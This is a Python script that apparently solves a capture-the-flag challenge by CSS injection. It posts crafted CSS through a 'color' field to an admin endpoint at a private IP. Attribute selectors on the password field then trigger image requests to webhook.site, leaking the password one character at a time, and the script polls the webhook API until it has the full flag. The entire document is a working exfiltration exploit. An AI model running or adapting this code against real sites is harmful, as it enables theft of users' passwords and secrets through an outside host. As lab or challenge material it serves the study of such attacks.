import requests
import time
import string
from urllib.parse import unquote

TARGET = "http://10.0.118.48:7777/admin"
VIEW_URL = "http://10.0.118.48:7777/view"
WEBHOOK_TOKEN = "4fee6e38-c18a-4ca9-b2ba-78f3e17bf9d2"
WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_TOKEN}/requests"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_@"
prefix = ""

def get_urls():
    r = requests.get(WEBHOOK_API)
    return [req["url"] for req in r.json()["data"]]

def css_escape(s):
    return (
        s.replace("\\", "\\\\")
         .replace('"', '\\"')
         .replace("{", "\\{")
         .replace("}", "\\}")
    )

def send_batch(prefix):
    css = "blue;}\n"
    for ch in charset:
        test = prefix + ch
        safe = css_escape(test)

        css += f'''input[type="password"][value^="{safe}"] {{
background-image: url("https://webhook.site/{WEBHOOK_TOKEN}/{test}");
}}\n'''

    requests.post(TARGET, data={
        "url": VIEW_URL,
        "color": css
    })

while True:
    print(f"[*] Current prefix: {prefix}")
    send_batch(prefix)
    time.sleep(3)
    urls = get_urls()
    best = ""
    for ch in charset:
        candidate = prefix + ch
        for url in urls:
            decoded = unquote(url)
            if f"/{candidate}" in decoded:
                if len(candidate) > len(best):
                    best = candidate
    if best:
        prefix = best
        print(f"[+] Found: {prefix}\n")
    else:
        print("\n[!] Final flag:", prefix)
        break